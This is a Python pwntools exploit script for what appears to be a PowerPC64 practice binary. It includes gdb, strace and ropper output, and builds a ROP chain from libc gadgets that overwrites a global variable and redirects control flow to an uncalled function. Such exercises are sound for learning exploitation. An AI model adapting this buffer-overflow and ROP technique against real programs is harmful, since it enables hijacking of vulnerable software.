#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000010000794 <+0>:	mflr    r0
...
   0x00000000100007f4 <+96>:	ld      r0,16(r1)
   0x00000000100007f8 <+100>:	mtlr    r0
   0x00000000100007fc <+104>:	ld      r31,-8(r1)
   0x0000000010000800 <+108>:	blr
   0x0000000010000804 <+112>:	.long 0x0
   0x0000000010000808 <+116>:	.long 0x1
   0x000000001000080c <+120>:	lwz     r0,1(r1)
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x100007a8: file src/08-overwrite-global.c, line 9.
(gdb) b *0x00000000100007f4
Breakpoint 2 at 0x100007f4: file src/08-overwrite-global.c, line 14.
(gdb) b *0x0000000010000800
Breakpoint 3 at 0x10000800: file src/08-overwrite-global.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:9
9		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ff930 ""
(gdb) c
Continuing.

Breakpoint 2, 0x00000000100007f4 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) p/x $r1+16
$2 = 0x40007ff9d0
(gdb) c
Continuing.

Breakpoint 3, 0x0000000010000800 in vulnerable () at src/08-overwrite-global.c:14
14	}
(gdb) i r $r1
r1             0x40007ff9c0	274886293952
(gdb) p not_called
$3 = {void ()} 0x10000810 <not_called>
(gdb) p &x
$4 = (unsigned long *) 0x100200c8 <x>
"""

"""
$ qemu-ppc64 -L /usr/powerpc64-linux-gnu/ -strace ./bin/ppc64/08-overwrite-global
...
19379 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
19379 mmap(NULL,2381768,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000875000
...
"""

"""
$ ropper --nocolor --arch PPC64 --inst-count 9 --file /usr/powerpc64-linux-gnu/lib/libc-2.27.so
0x000eb7b8: ld r31, 0x78(r1); addi r1, r1, 0x80; ld r0, 0x10(r1); mtlr r0; blr;
0x000ae6a0: ld r0, 0x80(r1); ld r3, 0xa8(r1); mtlr r0; addi r1, r1, 0x70; blr;
0x001d86dc: addi r1, r1, 0x80; ld r0, 0x10(r1); std r3, 0(r31); ld r31, -8(r1); mtlr r0; blr;
"""

import struct
import sys

from pwn import *

context(arch='powerpc64', os='linux', endian='big', word_size=64)

binary_path = './bin/ppc64/08-overwrite-global'

saved_pc_addr = 0x40007ff9d0
buffer_addr = 0x40007ff930
libc_addr = 0x0000004000875000
not_called_addr = 0x10000810
x_addr = 0x100200c8

ld_r31_addr = libc_addr + 0x000eb7b8
ld_r3_addr = libc_addr + 0x000ae6a0
std_r3_r31_addr = libc_addr + 0x001d86dc

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p64(ld_r31_addr)

# <- $r1 + 24
payload += 'b' * (0x78 - 24)
payload += p64(x_addr) # r31
payload += 'c' * (0x90 - 0x78 - 8)
payload += p64(ld_r3_addr) # r0

# <- $r1 + 24
payload += 'e' * (0x80 - 24)
payload += p64(std_r3_r31_addr) # r0
payload += 'c' * (0xa8 - 0x80 - 8)
payload += p64(0xdeadbabebeefc0de) # r3
payload += 'e' * (0x70 + 0x80 - 0xa8 + 8)

# <- $r1 + 24 - 0x80
payload += p64(not_called_addr) # r0

p.readuntil('> ')
p.write(payload)
p.interactive()
